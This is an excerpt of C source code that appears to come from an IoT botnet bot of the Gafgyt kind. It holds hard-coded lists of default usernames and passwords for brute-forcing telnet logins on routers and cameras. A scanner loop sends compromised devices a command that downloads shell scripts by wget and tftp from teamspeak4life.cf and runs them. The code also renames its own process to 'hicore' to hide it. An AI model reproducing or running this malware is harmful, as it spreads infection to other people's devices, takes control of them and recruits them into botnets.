...
char *usernames[] = {"root\0", "\0", "admin\0", "user\0", "login\0", "guest\0", "support\0", "cisco\0", "netgear\0", "dreambox\0", "\0", "D-Link\0", "ubnt\0"};
char *passwords[] = {"root\0", "\0", "toor\0", "admin\0", "user\0", "guest\0", "login\0", "changeme\0", "1234\0", "12345\0", "123456\0", "default\0", "pass\0", "password\0", "support\0", "cisco\0", "netgear\0", "dreambox\0", "\0", "123456789\0", "vizxv\0", "D-Link\0", "ubnt\0"};
...
void StartTheLelz(int nothing)
{
	...
	while(1)
	{
		for(i = 0; i < max; i++)
		{
			...
			case 8:
				{
					if(send(fds[i].fd, "cd /tmp || cd /var/run;wget http://teamspeak4life.cf/gtop.sh;sh gtop.sh;rm gtop.sh;tftp -r tftp1.sh -g teamspeak4life.cf; chmod 777 *.sh;sh gtop.sh;sh tftp1.sh\r\n", 161, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
					fds[i].state = 9;
				}
...
int main(int argc, unsigned char *argv[])
{
	...
	strncpy(argv[0],"hicore",strlen(argv[0]));
